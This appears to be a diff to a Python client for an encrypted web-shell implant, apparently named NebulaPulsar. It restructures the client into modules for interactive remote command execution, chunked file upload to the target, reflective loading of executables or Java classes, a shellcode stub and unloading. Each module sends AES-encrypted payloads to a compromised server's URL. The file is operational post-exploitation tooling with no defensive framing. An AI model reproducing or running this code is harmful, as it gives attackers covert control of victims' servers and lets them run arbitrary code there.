@@ -66,89 +66,195 @@ def obfus_class_name(class_bytes: bytes, name: str = 'DarkMatter'):
 
     return patched_bytes
 
-def do_cmd(session, payload: str):
+def do_shell(session, payload: str):
     with open(payload, 'rb') as f:
         payload_bytes = f.read()
 
     while True:
+        cmd = input('> ')
+        if cmd.strip().lower() in ['exit', 'quit']:
+            break
+        if not cmd.strip():
+            continue
+
+        param_str = f'action=CMD&cmd={cmd}&mode=' + ('volatile' if args.volatile else 'persistent')
+
+        dynamic_bytes = payload_bytes # obfus_class_name(payload_bytes, MAGIC_PAYLOAD)
+        class_len = len(dynamic_bytes)
+
+        raw_payload = struct.pack('>I', class_len) + dynamic_bytes + param_str.encode('utf-8')
+        encrypted_payload = aes_encrypt(raw_payload)
+
+        headers = {
+            'Content-Type': 'application/octet-stream'
+        }
+
+        resp = session.post(args.url, data=encrypted_payload, headers=headers)
+
         try:
-            action = input(f'{Colors.YELLOW}[1]{Colors.RESET}: Command execution {Colors.YELLOW}[2]{Colors.RESET}: Reflective Loader {Colors.YELLOW}[3]{Colors.RESET}: Exit > ')
+            resp_text = aes_decrypt(resp.content).decode(args.encoding)
+            print(resp_text)
+        except Exception as ex:
+            print(resp.text)
 
-            if action == '1': # terminal
-                while True:
+def do_upload(session, payload: str):
+    with open(payload, 'rb') as f:
+        payload_bytes = f.read()
 
-                    cmd = input('> ')
-                    if cmd.strip().lower() in ['exit', 'quit']:
-                        break
-                    if not cmd.strip():
-                        continue
+    src_filepath = input('Source file path: ')
+    if not os.path.exists(src_filepath):
+        print_error('File not found: ' + src_filepath)
+        return
+    
+    print_logs('Source file => ' + src_filepath)
 
-                    param_str = f'action=CMD&cmd={cmd}&mode=' + ('volatile' if args.volatile else 'persistent')
+    dst_filepath = input('Destination file path: ')
 
-                    dynamic_bytes = payload_bytes # obfus_class_name(payload_bytes, MAGIC_PAYLOAD)
-                    class_len = len(dynamic_bytes)
+    size = os.path.getsize(src_filepath)
+    chunk_size = input('Chunk size(4096): ')
+    if not chunk_size:
+        chunk_size = 1024 * 4
 
-                    raw_payload = struct.pack('>I', class_len) + dynamic_bytes + param_str.encode('utf-8')
-                    encrypted_payload = aes_encrypt(raw_payload)
+    print_logs(f'Chunk size => {chunk_size}')
 
-                    headers = {
-                        'Content-Type': 'application/octet-stream'
-                    }
+    with open(src_filepath, 'rb') as f:
+        flag = True
+        read = 0
+        while chunk := f.read(chunk_size):
+            read += chunk_size
 
-                    resp = session.post(args.url, data=encrypted_payload, headers=headers)
+            param_str = f'action=UPLOAD&mode=' + ('volatile' if args.volatile else 'persistent') + f'&path={dst_filepath}&buffer={base64.b64encode(chunk).decode("utf-8")}'
+            class_len = len(payload_bytes)
+            raw_payload = struct.pack('>I', class_len) + payload_bytes + param_str.encode('utf-8')
+            encrypted_payload = aes_encrypt(raw_payload)
+            headers = {
+                'Content-Type': 'application/octet-stream'
+            }
 
-                    try:
-                        resp_text = aes_decrypt(resp.content).decode(args.encoding)
-                        print(resp_text)
-                    except Exception as ex:
-                        print(resp.text)
+            resp = session.post(args.url, data=encrypted_payload, headers=headers)
+            try:
+                resp_text = aes_decrypt(resp.content).decode(args.encoding)
+                percent = read / size * 100
 
-            elif action == '2':
+                print(f'Sent chunk: {len(chunk):,} bytes ({percent:6.2f}%)[{read:,}/{size:,}]', end='\r', flush=True)
+            except Exception as ex:
+                flag = False
+                print_error(str(ex))
+                print_error(resp.text)
 
-                payload_path = input(f'Payload source ({"*.exe" if args.script == "cs" else "*.class"})> ')
-                if not os.path.exists(payload_path):
-                    print_error('Payload not found: ' + payload_path)
+        if flag:
+            print()
+            print_success('Uploaded file successfully')
+        else:
+            print_error('Failed to uplaod file')
+
+    return
+
+def do_shellcode(session, payload: str):
+    with open(payload, 'rb') as f:
+        payload_bytes = f.read()
+
+    
+
+def do_reflective(session, payload: str):
+    with open(payload, 'rb') as f:
+        payload_bytes = f.read()
+
+    payload_path = input(f'Payload source ({"*.exe" if args.script == "cs" else "*.class"})> ')
+    if not os.path.exists(payload_path):
+        print_error('Payload not found: ' + payload_path)
+        return
+
+    with open(payload_path, 'rb') as f:
+        payload_exe = f.read()
+
+    param_str = f'action=LOAD&mode=' + ('volatile' if args.volatile else 'persistent') + f'&buffer={base64.b64encode(payload_exe).decode("utf-8")}'
+
+    class_len = len(payload_bytes)
+
+    raw_payload = struct.pack('>I', class_len) + payload_bytes + param_str.encode('utf-8')
+    encrypted_payload = aes_encrypt(raw_payload)
+
+    print_logs(f'Length: {len(payload_exe)}')
+
+    headers = {
+        'Content-Type': 'application/octet-stream'
+    }
+
+    resp = session.post(args.url, data=encrypted_payload, headers=headers)
+
+    try:
+        resp_text = aes_decrypt(resp.content).decode(args.encoding)
+        print(resp_text)
+    except Exception as ex:
+        print(resp.text)
+
+    return
+
+def do_unload(session, payload):
+
+    print_logs("Sending UNLOAD signal to clear memory...")
+    param = 'action=UNLOAD'
+    raw_payload = struct.pack('>I', 0) + param.encode('utf-8')
+    encrypted_payload = aes_encrypt(raw_payload)
+    
+    headers = {'Content-Type': 'application/octet-stream'}
+    resp = session.post(args.url, data=encrypted_payload, headers=headers)
+    print_success(f"Server response: {resp.text.strip()}")
+
+    exit()
+
+def do_interactive(session, payload: str):
+
+    dicFunction = {
+        'cs' : {
+
+            # Module          # Description
+
+            do_shell        : 'Command execution',
+            do_reflective   : 'Reflective load',
+            do_shellcode    : 'Shellcode execution',
+            do_upload       : 'Upload file',
+            do_unload       : 'Unload NebulaPulsar (exit)',
+
+        },
+        'java' : {
+
+            # Module          # Description
+
+            do_shell        : 'Command execution',
+            do_reflective   : 'Reflective load',
+            do_upload       : 'Upload file',
+            do_unload       : 'Unload NebulaPulsar (exit)',
+
+        }
+    }
+
+    while True:
+        try:
+
+            func_available = list(dicFunction[args.script].keys())
+
+            print()
+
+            print_logs('Available modules:')
+            for i in range(len(func_available)):
+                print(f'{Colors.YELLOW}[{i + 1}]{Colors.RESET} {dicFunction[args.script][func_available[i]]}')
+
+            print()
+
+            try:
+                option = int(input('Function> ')) - 1
+                if option < 0 or option >= len(func_available):
+                    print_error(f'Invalid option: {option}')
                     continue
 
-                with open(payload_path, 'rb') as f:
-                    payload_exe = f.read()
+                func = func_available[option]
+                func(session, payload)
 
-                param_str = f'action=PELOADER&mode=' + ('volatile' if args.volatile else 'persistent') + f'&z0=x64&z1={base64.b64encode(payload_exe).decode("utf-8")}'
-
-                class_len = len(payload_bytes)
-
-                raw_payload = struct.pack('>I', class_len) + payload_bytes + param_str.encode('utf-8')
-                encrypted_payload = aes_encrypt(raw_payload)
-
-                print_logs(f'Length: {len(payload_exe)}')
-
-                headers = {
-                    'Content-Type': 'application/octet-stream'
-                }
-
-                resp = session.post(args.url, data=encrypted_payload, headers=headers)
-
-                try:
-                    resp_text = aes_decrypt(resp.content).decode(args.encoding)
-                    print(resp_text)
-                except Exception as ex:
-                    print(resp.text)
-
-            elif action == '3':
-                print_logs("Sending UNLOAD signal to clear memory...")
-                param = 'action=UNLOAD'
-                raw_payload = struct.pack('>I', 0) + param.encode('utf-8')
-                encrypted_payload = aes_encrypt(raw_payload)
-                
-                headers = {'Content-Type': 'application/octet-stream'}
-                resp = session.post(args.url, data=encrypted_payload, headers=headers)
-                print_success(f"Server response: {resp.text.strip()}")
-                break
-
-            else:
-                print_error('Unknown action')
-
-            
+            except Exception as ex:
+                print(str(ex))
+                continue
 
         except KeyboardInterrupt:
             break
@@ -201,6 +307,27 @@ def main():
     
     print('')
 
+    # Test HTTP connection
+    try:
+        print_logs('Test connection')
+
+        resp = requests.get(args.url, timeout=10)
+        resp.raise_for_status()
+
+        print_success('Connection successful')
+    except requests.exceptions.HTTPError as e:
+        print_error(f'HTTP error: {e}')
+        return
+    except requests.exceptions.ConnectionError:
+        print_error('Could not connect to the server.')
+        return
+    except requests.exceptions.Timeout:
+        print_error('Request timed out')
+        return
+    except requests.exceptions.RequestException as e:
+        print_error('Request failed: {e}')
+        return
+
     # start exploitation
 
     session = requests.Session()
@@ -230,7 +357,7 @@ def main():
 
     print()
 
-    do_cmd(session, payload)
+    do_interactive(session, payload)
 
 if __name__ == '__main__':
     main()
